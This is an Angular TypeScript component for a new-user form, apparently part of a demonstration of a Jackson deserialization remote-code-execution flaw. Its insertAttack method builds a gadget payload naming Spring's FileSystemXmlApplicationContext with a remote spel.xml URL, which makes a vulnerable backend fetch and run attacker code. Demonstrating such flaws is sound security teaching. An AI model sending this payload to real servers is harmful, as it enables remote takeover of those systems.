import { Component, OnInit } from '@angular/core';
import {BackendService} from '../../services/backend.service';
import {User} from '../../models/user.model';

@Component({
  selector: 'app-new-user',
  templateUrl: './new-user.component.html',
  styleUrls: ['./new-user.component.scss']
})
export class NewUserComponent implements OnInit {

  constructor(public backendService: BackendService) { }

  public newUser: User | any = new User();

  saveResponse;

  ngOnInit() {
  }

  public saveUser() {
    this.backendService.saveUser(this.newUser).subscribe(
      (val) => {
        this.saveResponse = val;
      },
      response => {
        this.saveResponse =  response;
      },
      () => {
        console.log('The POST observable is now completed.');
      });
  }

  public textareaChange(e: any) {
    this.newUser = <any>JSON.parse(e);
  }

  public insertAttack() {
    this.newUser = <User>{'name': 'Max Mustermann', 'phone': ["org.springframework.context.support.FileSystemXmlApplicationContext", "https://raw.githubusercontent.com/JavanXD/Demo-Exploit-Jackson-RCE/master/docs/spel.xml"]};

  }
}
